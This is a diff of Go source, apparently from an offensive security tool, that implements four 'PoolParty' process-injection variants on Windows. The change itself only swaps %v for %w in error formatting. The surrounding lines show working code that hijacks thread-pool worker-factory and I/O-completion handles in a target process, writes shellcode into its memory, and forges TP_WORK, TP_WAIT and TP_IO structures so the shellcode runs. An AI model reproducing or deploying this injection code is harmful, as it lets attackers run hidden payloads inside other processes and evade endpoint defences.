@@ -21,7 +21,7 @@ func executeVariant1(shellcode []byte, pid uint32) (string, error) {
 	// Step 2: Hijack TpWorkerFactory handle
 	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
 	if err != nil {
-		return output, fmt.Errorf("failed to hijack worker factory handle: %v", err)
+		return output, fmt.Errorf("failed to hijack worker factory handle: %w", err)
 	}
 	defer windows.CloseHandle(hWorkerFactory)
 	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)
@@ -44,7 +44,7 @@ func executeVariant1(shellcode []byte, pid uint32) (string, error) {
 	// Step 4: Write shellcode to start routine address
 	bytesWritten, err := injectWriteMemory(hProcess, workerFactoryInfo.StartRoutine, shellcode)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory failed: %v", err)
+		return output, fmt.Errorf("WriteProcessMemory failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Wrote %d bytes to start routine address\n", bytesWritten)
 
@@ -76,7 +76,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	// Step 2: Hijack TpWorkerFactory handle
 	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
 	if err != nil {
-		return output, fmt.Errorf("failed to hijack worker factory handle: %v", err)
+		return output, fmt.Errorf("failed to hijack worker factory handle: %w", err)
 	}
 	defer windows.CloseHandle(hWorkerFactory)
 	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)
@@ -99,7 +99,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	var targetTpPool FULL_TP_POOL
 	err = injectReadMemoryInto(hProcess, workerFactoryInfo.StartParameter, unsafe.Pointer(&targetTpPool), int(unsafe.Sizeof(targetTpPool)))
 	if err != nil {
-		return output, fmt.Errorf("ReadProcessMemory for TP_POOL failed: %v", err)
+		return output, fmt.Errorf("ReadProcessMemory for TP_POOL failed: %w", err)
 	}
 	output += "[+] Read target process's TP_POOL structure\n"
 
@@ -112,7 +112,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	var targetQueue TPP_QUEUE
 	err = injectReadMemoryInto(hProcess, targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH], unsafe.Pointer(&targetQueue), int(unsafe.Sizeof(targetQueue)))
 	if err != nil {
-		return output, fmt.Errorf("ReadProcessMemory for TPP_QUEUE failed: %v", err)
+		return output, fmt.Errorf("ReadProcessMemory for TPP_QUEUE failed: %w", err)
 	}
 	output += "[+] Read target process's task queue structure\n"
 
@@ -129,7 +129,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 		0,             // Callback environment
 	)
 	if pTpWork == 0 {
-		return output, fmt.Errorf("work item creation failed: %v", err)
+		return output, fmt.Errorf("work item creation failed: %w", err)
 	}
 	output += "[+] Created TP_WORK structure associated with shellcode\n"
 
@@ -157,13 +157,13 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	var currentQueueFlink uintptr
 	err = injectReadMemoryInto(hProcess, targetQueueListAddr, unsafe.Pointer(&currentQueueFlink), int(unsafe.Sizeof(currentQueueFlink)))
 	if err != nil {
-		return output, fmt.Errorf("ReadProcessMemory for current queue Flink failed: %v", err)
+		return output, fmt.Errorf("ReadProcessMemory for current queue Flink failed: %w", err)
 	}
 
 	var currentQueueBlink uintptr
 	err = injectReadMemoryInto(hProcess, targetQueueListAddr+8, unsafe.Pointer(&currentQueueBlink), int(unsafe.Sizeof(currentQueueBlink)))
 	if err != nil {
-		return output, fmt.Errorf("ReadProcessMemory for current queue Blink failed: %v", err)
+		return output, fmt.Errorf("ReadProcessMemory for current queue Blink failed: %w", err)
 	}
 
 	output += fmt.Sprintf("[*] Current queue Flink: 0x%X, Blink: 0x%X (queue list addr: 0x%X)\n", currentQueueFlink, currentQueueBlink, targetQueueListAddr)
@@ -187,7 +187,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	// Step 10: Allocate memory for TP_WORK in target process
 	tpWorkAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpWork)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("remote allocation for TP_WORK failed: %v", err)
+		return output, fmt.Errorf("remote allocation for TP_WORK failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Allocated TP_WORK memory at: 0x%X\n", tpWorkAddr)
 
@@ -195,7 +195,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	tpWorkBytes := (*[1 << 20]byte)(unsafe.Pointer(&tpWork))[:unsafe.Sizeof(tpWork)]
 	bytesWritten, err := injectWriteMemory(hProcess, tpWorkAddr, tpWorkBytes)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for TP_WORK failed: %v", err)
+		return output, fmt.Errorf("WriteProcessMemory for TP_WORK failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Wrote TP_WORK structure (%d bytes)\n", bytesWritten)
 
@@ -214,7 +214,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	flinkBytes := (*[8]byte)(unsafe.Pointer(&remoteWorkItemTaskListAddr))[:]
 	_, err = injectWriteMemory(hProcess, targetQueueListAddr, flinkBytes)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for queue Flink failed: %v", err)
+		return output, fmt.Errorf("WriteProcessMemory for queue Flink failed: %w", err)
 	}
 
 	// Update queue's Blink based on whether queue was empty
@@ -232,7 +232,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	blinkBytes := (*[8]byte)(unsafe.Pointer(&blinkTarget))[:]
 	_, err = injectWriteMemory(hProcess, targetQueueListAddr+uintptr(unsafe.Sizeof(uintptr(0))), blinkBytes)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for queue Blink failed: %v", err)
+		return output, fmt.Errorf("WriteProcessMemory for queue Blink failed: %w", err)
 	}
 
 	// If there was an existing first item, update its Blink to point to our work item
@@ -243,7 +243,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 		oldBlinkBytes := (*[8]byte)(unsafe.Pointer(&remoteWorkItemTaskListAddr))[:]
 		_, err = injectWriteMemory(hProcess, oldFirstItemBlinkAddr, oldBlinkBytes)
 		if err != nil {
-			return output, fmt.Errorf("WriteProcessMemory for old first item Blink failed: %v", err)
+			return output, fmt.Errorf("WriteProcessMemory for old first item Blink failed: %w", err)
 		}
 		output += "[*] Updated old first item's Blink pointer\n"
 	}
@@ -265,7 +265,7 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 	// Step 2: Hijack I/O completion port handle
 	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
 	if err != nil {
-		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
+		return output, fmt.Errorf("failed to hijack I/O completion handle: %w", err)
 	}
 	defer windows.CloseHandle(hIoCompletion)
 	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)
@@ -283,7 +283,7 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 		0,             // Callback environment
 	)
 	if pTpWait == 0 {
-		return output, fmt.Errorf("wait item creation failed: %v", err)
+		return output, fmt.Errorf("wait item creation failed: %w", err)
 	}
 	output += "[+] Created TP_WAIT structure associated with shellcode\n"
 
@@ -291,7 +291,7 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 	var tpWait FULL_TP_WAIT
 	tpWaitAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpWait)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("remote allocation for TP_WAIT failed: %v", err)
+		return output, fmt.Errorf("remote allocation for TP_WAIT failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Allocated TP_WAIT memory at: 0x%X\n", tpWaitAddr)
 
@@ -299,7 +299,7 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 	tpWaitBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpWait))[:unsafe.Sizeof(tpWait)]
 	bytesWritten, err := injectWriteMemory(hProcess, tpWaitAddr, tpWaitBytes)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for TP_WAIT failed: %v", err)
+		return output, fmt.Errorf("WriteProcessMemory for TP_WAIT failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Wrote TP_WAIT structure (%d bytes)\n", bytesWritten)
 
@@ -308,14 +308,14 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 	var tpDirect TP_DIRECT
 	tpDirectAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpDirect)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("remote allocation for TP_DIRECT failed: %v", err)
+		return output, fmt.Errorf("remote allocation for TP_DIRECT failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Allocated TP_DIRECT memory at: 0x%X\n", tpDirectAddr)
 
 	tpDirectBytes := (*[1 << 20]byte)(unsafe.Pointer(&pWaitStruct.Direct))[:unsafe.Sizeof(tpDirect)]
 	_, err = injectWriteMemory(hProcess, tpDirectAddr, tpDirectBytes)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for TP_DIRECT failed: %v", err)
+		return output, fmt.Errorf("WriteProcessMemory for TP_DIRECT failed: %w", err)
 	}
 	output += "[+] Wrote TP_DIRECT structure\n"
 
@@ -328,7 +328,7 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 		uintptr(unsafe.Pointer(eventName)),
 	)
 	if hEvent == 0 {
-		return output, fmt.Errorf("CreateEventW failed: %v", err)
+		return output, fmt.Errorf("CreateEventW failed: %w", err)
 	}
 	defer windows.CloseHandle(windows.Handle(hEvent))
 	output += "[+] Created event 'PoolPartyEvent'\n"
@@ -352,7 +352,7 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 	// Step 11: Set event to trigger callback
 	ret, _, err := procSetEvent.Call(hEvent)
 	if ret == 0 {
-		return output, fmt.Errorf("SetEvent failed: %v", err)
+		return output, fmt.Errorf("SetEvent failed: %w", err)
 	}
 	output += "[+] Set event to queue packet to I/O completion port\n"
 	output += "[+] PoolParty Variant 3 injection completed successfully\n"
@@ -374,7 +374,7 @@ func executeVariant4(shellcode []byte, pid uint32) (string, error) {
 	// Step 2: Hijack I/O completion port handle
 	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
 	if err != nil {
-		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
+		return output, fmt.Errorf("failed to hijack I/O completion handle: %w", err)
 	}
 	defer windows.CloseHandle(hIoCompletion)
 	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)
@@ -397,7 +397,7 @@ func executeVariant4(shellcode []byte, pid uint32) (string, error) {
 		0, // Template file
 	)
 	if hFile == uintptr(windows.InvalidHandle) {
-		return output, fmt.Errorf("CreateFileW failed: %v", err)
+		return output, fmt.Errorf("CreateFileW failed: %w", err)
 	}
 	defer windows.CloseHandle(windows.Handle(hFile))
 	output += "[+] Created file 'C:\\Windows\\Temp\\PoolParty.txt' with overlapped I/O\n"
@@ -410,7 +410,7 @@ func executeVariant4(shellcode []byte, pid uint32) (string, error) {
 		0,             // Callback environment
 	)
 	if pTpIo == 0 {
-		return output, fmt.Errorf("IO item creation failed: %v", err)
+		return output, fmt.Errorf("IO item creation failed: %w", err)
 	}
 	output += "[+] Created TP_IO structure associated with shellcode\n"
 
@@ -424,7 +424,7 @@ func executeVariant4(shellcode []byte, pid uint32) (string, error) {
 	var tpIo FULL_TP_IO
 	tpIoAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpIo)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("remote allocation for TP_IO failed: %v", err)
+		return output, fmt.Errorf("remote allocation for TP_IO failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Allocated TP_IO memory at: 0x%X\n", tpIoAddr)
 
@@ -432,7 +432,7 @@ func executeVariant4(shellcode []byte, pid uint32) (string, error) {
 	tpIoBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpIo))[:unsafe.Sizeof(tpIo)]
 	bytesWritten, err := injectWriteMemory(hProcess, tpIoAddr, tpIoBytes)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for TP_IO failed: %v", err)
+		return output, fmt.Errorf("WriteProcessMemory for TP_IO failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Wrote TP_IO structure (%d bytes)\n", bytesWritten)
 
